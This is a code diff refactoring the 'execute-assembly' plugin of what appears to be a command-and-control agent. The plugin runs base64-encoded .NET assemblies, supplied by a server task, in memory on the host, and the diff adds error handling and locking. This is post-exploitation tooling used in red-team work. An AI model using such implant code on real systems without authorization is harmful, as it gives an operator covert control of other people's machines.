@@ -2,15 +2,16 @@
 using Agent.Models;
 using System.Text.Json;
 using Agent.Utilities;
-using System.Security.Principal;
 
 namespace Agent
 {
     public class Plugin : IPlugin
     {
         public string Name => "execute-assembly";
-        private IMessageManager messageManager { get; set; }
-        private ConsoleApplicationExecutor? cae;
+        private readonly IMessageManager messageManager;
+        private readonly object stateLock = new();
+        private ConsoleApplicationExecutor? executor;
+
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
@@ -18,31 +19,63 @@ namespace Agent
 
         public async Task Execute(ServerJob job)
         {
-            if(this.cae is not null)
+            ExecuteAssemblyArgs? args;
+            try
             {
-                if (this.cae.IsRunning())
-                {
-                    messageManager.Write("Task is already running", job.task.id, true, "error");
-                    return;
-                }
+                args = JsonSerializer.Deserialize<ExecuteAssemblyArgs>(job.task.parameters);
+            }
+            catch (JsonException exception)
+            {
+                messageManager.Write("Invalid arguments: " + exception.Message, job.task.id, true, "error");
+                return;
             }
 
-            ExecuteAssemblyArgs args = JsonSerializer.Deserialize<ExecuteAssemblyArgs>(job.task.parameters);
-
-            if (!args.Validate())
+            if (args is null || !args.Validate())
             {
                 messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
                 return;
             }
 
-            if (messageManager.StdIsBusy())
+            ConsoleApplicationExecutor current;
+            Task execution;
+            lock (stateLock)
             {
-                messageManager.Write("Something already has StdOut captured", job.task.id, true, "error");
-                return;
+                if (executor?.IsRunning() == true)
+                {
+                    messageManager.Write("Task is already running", job.task.id, true, "error");
+                    return;
+                }
+
+                try
+                {
+                    current = new ConsoleApplicationExecutor(
+                        Misc.Base64DecodeToByteArray(args.asm),
+                        Misc.SplitCommandLine(args.arguments),
+                        job.task.id,
+                        messageManager);
+                    executor = current;
+                    execution = current.ExecuteAsync();
+                }
+                catch (Exception exception)
+                {
+                    executor = null;
+                    messageManager.Write(exception.Message, job.task.id, true, "error");
+                    return;
+                }
             }
 
-            cae = new ConsoleApplicationExecutor(Misc.Base64DecodeToByteArray(args.asm), Misc.SplitCommandLine(args.arguments), job.task.id, messageManager);
-            cae.Execute();
+            try
+            {
+                await execution.ConfigureAwait(false);
+            }
+            finally
+            {
+                lock (stateLock)
+                {
+                    if (ReferenceEquals(executor, current))
+                        executor = null;
+                }
+            }
         }
     }
 }
